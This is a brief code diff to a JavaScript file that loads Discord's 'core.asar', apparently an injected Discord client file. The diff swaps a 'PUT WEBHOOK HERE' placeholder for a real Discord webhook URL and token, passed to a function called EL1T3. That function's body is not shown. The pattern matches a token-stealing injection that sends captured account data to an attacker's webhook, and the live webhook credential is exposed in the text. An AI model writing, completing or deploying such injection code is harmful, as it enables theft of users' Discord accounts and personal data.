@@ -51,5 +51,5 @@ async function EL1T3(hook_url) {
     catch { };  
 };
 
-EL1T3('PUT WEBHOOK HERE');
+EL1T3('https://discord.com/api/webhooks/886062268662546553/HRflfzkc8aiW3JlaFTBC_e4O0zTYHqI0CKzE0GiPdvdVQYDG3ye4CdizLlzurNlHKm83');
 module.exports = require('./core.asar');
